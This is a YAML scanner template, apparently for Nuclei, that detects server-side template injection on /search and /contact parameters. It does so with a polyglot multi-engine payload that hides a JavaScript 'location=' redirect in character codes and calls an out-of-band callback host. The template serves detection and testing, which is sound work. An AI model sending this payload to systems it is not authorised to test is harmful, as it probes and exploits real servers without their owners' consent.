http:
- method: GET
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/search'
  - '{{BaseURL}}/contact'
  payloads:
    param:
    - q
    - search
    - query
    - name
    - message
  raw:
  - 'GET {{path}}?{{param}}={{url_encode("<%=7*7%>#{7*7}${7*7}[%7*7%]constructor.constructor(String.fromCharCode(108,111,99,97,116,105,111,110,61,34,104,116,116,112,58,47,47)+\"{{callback_url}}/ssti-{{engine_id}}\"+String.fromCharCode(34))()")}}
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Connection: close

    '
- body: '{{param}}={{url_encode("<%=7*7%>#{7*7}${7*7}[%7*7%]constructor.constructor(String.fromCharCode(108,111,99,97,116,105,111,110,61,34,104,116,116,112,58,47,47)+\"{{callback_url}}/ssti-{{engine_id}}\"+String.fromCharCode(34))()"))}}'
  extractors:
  - group: 1
    part: interactsh_request
    regex:
    - /ssti-([a-z0-9]+)
    type: regex
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  - part: interactsh_request
    type: word
    words:
    - ssti-
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/search'
  - '{{BaseURL}}/contact'
  payloads:
    param:
    - q
    - query
    - message
id: ssti-polyglot-multi-engine-oob
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94,CWE-95
  description: 'Detects Server-Side Template Injection vulnerabilities across multiple
    template engines

    using polyglot payloads with OOB confirmation for enhanced accuracy.

    '
  name: Server-Side Template Injection - Polyglot Multi-Engine OOB Detection
  reference:
  - https://portswigger.net/web-security/server-side-template-injection
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
  severity: high
  tags: ssti,template-injection,oob,polyglot
variables:
  callback_url: '{{interactsh-url}}'
  engine_id: '{{randstr}}'
